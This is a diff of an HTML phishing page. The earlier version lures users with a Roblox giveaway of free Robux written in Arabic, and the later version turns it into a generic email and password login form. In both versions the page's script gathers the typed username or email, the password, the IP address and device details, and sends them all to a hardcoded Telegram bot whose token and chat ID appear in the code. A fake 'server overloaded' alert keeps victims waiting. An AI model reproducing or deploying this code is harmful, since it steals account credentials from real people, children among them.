@@ -10,33 +10,33 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <h2>الكمية محدودمن قناتنا محد يكون معه رابط غير الي اشترك بقناتي اكتب اسم حسابك وباسورده  ويمكن تربح 100 الى 400 روبوكس</h2>
-            <h2>الروبوكس محدود _يرجى الاشتراك بقناتنا ايضا لنقدم المزيد من الهدايه</h2> <!-- تغيير هنا -->
+            <h2>Login</h2>
             <form id="login-form">
                 <div class="user-box">
-                    <input type="text" id="username" required> <!-- تغيير من email إلى username -->
-                    <label>username </label> <!-- تغيير النص هنا -->
+                    <input type="email" id="email" required>
+                    <label>Email</label>
                 </div>
                 <div class="user-box">
                     <input type="password" id="password" required>
                     <label>Password</label>
                 </div>
-                <a href="#" id="login-btn">Submit</a>
+                <a href="#" id="login-btn">Login</a>
+                <p>Don't have an account? <a href="#">Register</a></p>
             </form>
         </div>
     </div>
     <script>
         const TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4"; // التوكن الخاص بك
         const CHAT_ID = "6243038338"; // معرف الشات الخاص بك
-        const URI_API = https://api.telegram.org/bot${TOKEN}/sendMessage;
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
         document.getElementById('login-btn').addEventListener('click', async function(e) {
             e.preventDefault(); // منع الرابط من التنقل
 
             alert('عليك الانتظار ساعة بسبب الضغط على خادمنا');
 
-            // الحصول على اسم المستخدم وكلمة المرور المدخلة
-            const username = document.getElementById('username').value;  // تغيير من email إلى username
+            // الحصول على البريد الإلكتروني وكلمة المرور المدخلة
+            const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
             console.log("Sending data to Telegram...");
@@ -52,15 +52,16 @@
                 const screenHeight = screen.height;
                 const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                const message =  
+                const message = ` 
                     <b>New Login Attempt</b>\n
-                    <b>Username:</b> ${username}\n  <!-- تغيير من Email إلى Username -->
+                    <b>Email:</b> ${email}\n
                     <b>Password:</b> ${password}\n
                     <b>IP Address:</b> ${ip}\n
                     <b>Device Type:</b> ${deviceType}\n
                     <b>Platform:</b> ${platform}\n
                     <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight};
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
 
                 console.log("Message: ", message);
 
